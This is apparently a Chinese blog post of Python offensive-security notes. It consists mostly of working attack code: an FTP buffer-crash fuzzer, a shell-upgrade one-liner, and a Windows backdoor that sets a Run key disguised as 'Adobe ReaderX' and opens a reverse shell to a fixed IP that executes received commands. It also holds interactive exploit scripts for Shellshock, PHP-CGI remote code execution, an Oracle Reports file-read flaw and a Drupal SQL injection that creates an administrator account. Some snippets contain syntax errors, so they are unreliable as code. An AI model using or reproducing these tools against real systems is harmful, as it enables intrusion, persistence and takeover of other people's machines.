---
title: python安全编程
date: 2022-11-27 11:41:49
tags:
---

## 模糊测试

**场景**

当我们进行exploit研究和开发的时候就可以使用脚本语言发送大量的测试数据给受害者机器，但是这个错误数据数据很容易引发应用程序崩溃掉。而Python却不同，当程序崩溃你与程序断开连接了，Python脚本会马上建立一个新的连接去继续测试。

**基本思路**

就是先与服务器建立连接,然后发送测试数据给服务器，通过while循环语句来判断是否成功，即使出现错误也会处理掉

```Python
 #导入socket,sys模块，如果是web服务那么还需要导入httplib,urllib等模块
 <import modules> 

#设置ip/端口
#调用脚本: ./script.py <RHOST> <RPORT>
RHOST = sys.argv[1]
RPORT = sys.argv[2]

#定义你的测试数据,并且设置测试数据范围值
buffer = '\x41'*50

#使用循环来连接服务并且发送测试数据
while True:
  try:
    # 发送测试数据
    # 直到递增到50
    buffer = buffer + '\x41'*50
  except:
    print "Buffer Length: "+len(buffer)
    print "Can't connect to service...check debugger for potential crash"
```

```Python
#导入你将要使用的模块，这样你就不用去自己实现那些功能函数了
import sys, socket
from time import sleep

#声明第一个变量target用来接收从命令端输入的第一个值
target = sys.argv[1]
#创建50个A的字符串 '\x41'
buff = '\x41'*50

# 使用循环来递增至声明buff变量的长度50
while True:
  #使用"try - except"处理错误与动作
  try:
    # 连接这目标主机的ftp端口 21
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,21))
    s.recv(1024)

    print "Sending buffer with length: "+str(len(buff))
    #发送字符串:USER并且带有测试的用户名
    s.send("USER "+buff+"\r\n")
    s.close()
    sleep(1)
    #使用循环来递增直至长度为50
    buff = buff + '\x41'*50

  except: # 如果连接服务器失败，我们就打印出下面的结果
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()
```

## 生成exe文件

```Shell
python pyinstaller.py -onefile <scriptName>
```

## 自动化命令

subprocess允许你执行命令直接通过stdout赋值给一个变量,这样你就可以在结果输出之前做一些操作

```Shell
>>> com_str = 'id'
>>> command = subprocess.Popen([com_str], stdout=subprocess.PIPE, shell=True)
>>> (output, error) = command.communicate()
>>> output
'uid=1000(cell) gid=1000(cell) groups=1000(cell),0(root)\n'
>>> f = open('file.txt', 'w')
>>> f.write(output)
>>> f.close()
>>> for line in open('file.txt', 'r'):
...   print line
...
uid=1000(cell) gid=1000(cell) groups=1000(cell),0(root)

>>>
```

## 伪终端

```Shell
python -c "import pty;pty.spawn("/bin/bash")"
```

## exp

```Python
import sys, base64, os, socket, subprocess
from _winreg import *
#把程序拷贝到%TEMP%目录下面并且修改了注册表,当用户登录到系统的时间就会执行这个后门
def autorun(tempdir, fileName, run):
# Copy executable to %TEMP%:
    os.system('copy %s %s'%(fileName, tempdir))

# Queries Windows registry for the autorun key value
# Stores the key values in runkey array
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey =[]
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass

# If the autorun key "Adobe ReaderX" isn't set this will set the key:
    if 'Adobe ReaderX' not in runkey:
        try:
            key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
            SetValueEx(key ,'Adobe_ReaderX',0,REG_SZ,r"%TEMP%\mw.exe")
            key.Close()
        except WindowsError:
            pass
#这个程序执行的时候会与攻击者的电脑建立一个连接,但是脚本中的连接是一个固定IP,这里可以修改为一个域名或者是Amazon cloud的服务地址
def shell():
#Base64 encoded reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.56.1', int(443)))
    s.send('[*] Connection Established!')
    while 1:
        data = s.recv(1024)
        if data == "quit": break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        encoded = base64.b64encode(stdout_value)
        s.send(encoded)
        #s.send(stdout_value)
    s.close()

def main():
    tempdir = '%TEMP%'
    fileName = sys.argv[0]
    run = "Software\Microsoft\Windows\CurrentVersion\Run"
    autorun(tempdir, fileName, run)
    shell()

if __name__ == "__main__":
        main()
```

## **示例**

### CVE-2014-6271

修改浏览器的User-Agent 信息,然后不停的向攻击主机发送一个恶意的指令(这里是执行某个特定的命令)

```Python
#!/usr/bin/python
import sys, urllib2    #导入需要使用的模块

if len(sys.argv) != 2:    # 检查输入命令的格式是否正确 "<script> <URL>"
  print "Usage: "+sys.argv[0]+" <URL>"
  sys.exit(0)

URL=sys.argv[1]        # 把测试的URL输出显示出来
print "[+] Attempting Shell_Shock - Make sure to type full path"

while True:        # 通过raw_input来获取用户输入的值,如果是"~$"就停止执行 
  command=raw_input("~$ ")
  opener=urllib2.build_opener()        # 修改默认的请求头部,把修改后的User-Agent包含进去
  opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ' /bin/bash -c "'+command+'"')]
  try:                    # 使用Try/Except 进行错误处理
    response=opener.open(URL)    #提交请求并且显示响应结果
    for line in response.readlines():
      print line.strip()
  except Exception as e: 
  	print e
```

### CVE-2012-1823

通过一个简单的循环来获取PoC使用者频繁输入的内容,并且修改Http头,Post提交请求

```Python
#!/usr/bin/python
import sys, urllib2    #导入需要的模块

if len(sys.argv) != 2:    # 检查输入的格式是否正确 "<script> <URL>"
  print "Usage: "+sys.argv[0]+" <URL>"
  sys.exit(0)

URL=sys.argv[1]        # 输出测试的url链接 "[+] Attempting CVE-2012-1823 - PHP-CGI RCE"

while True:        # 循环开始时先输出 "~$ " 然后通过"raw_input"获取要执行的命令
  command=raw_input("~$ ")
  Host = URL.split('/')[2]      # 从URL解析主机名: 'http://<host>/' 并且赋值给Host <host>
  headers = {                   # 定义响应头部
    'Host': Host,
    'User-Agent': 'Mozilla',
    'Connection': 'keep-alive'}
  data = "<?php system('"+command+"');die(); ?>"        # PHP运行的服务器
  req = urllib2.Request(URL+"?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data, headers)

  try:                    # 使用Try/Except处理响应信息
    response = urllib2.urlopen(req)     # 发起请求
    for line in response.readlines():
      print line.strip()
    except Exception as e: print e
```

### CVE-2012-3152

通过循环可以无限输入需要访问文件目录

```Python
#!/usr/bin/python
import sys, urllib2    # 导入需要的包
from termcolor import colored   # 这里需要下载"termcolor"模块

if len(sys.argv) != 2:    # 检查输入的格式是否正确"<script> <URL>"
  print "Usage: "+sys.argv[0]+" <URL>"
  sys.exit(0)

URL=sys.argv[1]        # 输出测试的URL
print "[+] Attempting CVE-2012-3152 - Oracle Reports LFI"

while True:        #  循环开始时先输出 "~$ " 然后通过"raw_input"获取要执行的命令
  resource=raw_input(colored("~$ ", "red"))
  req = '/reports/rwservlet?report=test.rdf+desformat=html+destype=cache+JOBTYPE=rwurl+URLPARAMETER="file:///'+resource+'"'
  try:                    # 使用Try/Except处理响应信息
    response=urllib2.urlopen(URL+req)
    # 发起请求并且显示响应内容
    for line in response.readlines():
      print line.strip()
  except Exception as e: print e
```

### CVE-2014-3704

实现一个SQL注入的功能,这个脚本正确执行之后会添加一个新的管理员用户

```Python
#!/usr/bin/python
import sys, urllib2 # 导入需要的模块

if len(sys.argv) != 2: # 检查输入的格式是否正确"<script> <URL>"
 print "Usage: "+sys.argv[0]+" [URL]"
 sys.exit(0)

URL=sys.argv[1] # 输出测试的URL
print "[+] Attempting CVE-2014-3704 Drupal 7.x SQLi"
user=raw_input("Username to add: ") # 获取输入的username和password

Host = URL.split('/')[2] # 从URL解析主机名: 'http://<host>/' 并且赋值给Host <host>

headers = { # 定义响应头部

 'Host': Host,
 'User-Agent': 'Mozilla',
 'Connection': 'keep-alive'}

#提交的格式化后的SQL:

# insert into users (uid, name, pass, mail, status) select max(uid)+1, '"+user+"', '[password_hash]', '[email protected]', 1 from users; insert into users_roles (uid, rid) VALUES ((select uid from users where name='"+user+"'), (select rid from role where name = 'administrator')

data = "name%5b0%20%3binsert%20into%20users%20%28uid%2c%20name%2c%20pass%2c%20mail%2c%20status%29%20select%20max%28uid%29%2b1%2c%20%27"+user+"%27%2c%20%27%24S%24$S$CTo9G7Lx27gCe3dTBYhLhZOTqtJrlc7n31BjHl/aWgfK82GIACiTExGY3A9yrK1l3DdUONFFv8xV8SH9wr4r23HJauz47c/%27%2c%20%27email%40gmail.com%27%2c%201%20from%20users%3b%20insert%20into%20users_roles%20%28uid%2c%20rid%29%20VALUES%20%28%28select%20uid%20from%20users%20where%20name%3d%27"+user+"%27%29%2c%20%28select%20rid%20from%20role%20where%20name%20%3d%20%27administrator%27%29%29%3b%3b%20%23%20%5d=zRGAcKznoV&name%5b0%5d=aYxxuroJbo&pass=lGiEbjpEGm&form_build_id=form-5gCSidRr8NruKFEYt3eunbFEhLCfJaGuqGAnu80Vv0M&form_id=user_login_block&op=Log%20in"
req = urllib2.Request(URL+"?q=node&destination=node", data, headers)

try: # 使用Try/Except处理响应信息

 response = urllib2.urlopen(req) # 发起请求
 print "Account created with user: "+user+" and password: password"
except Exception as e: print e
```



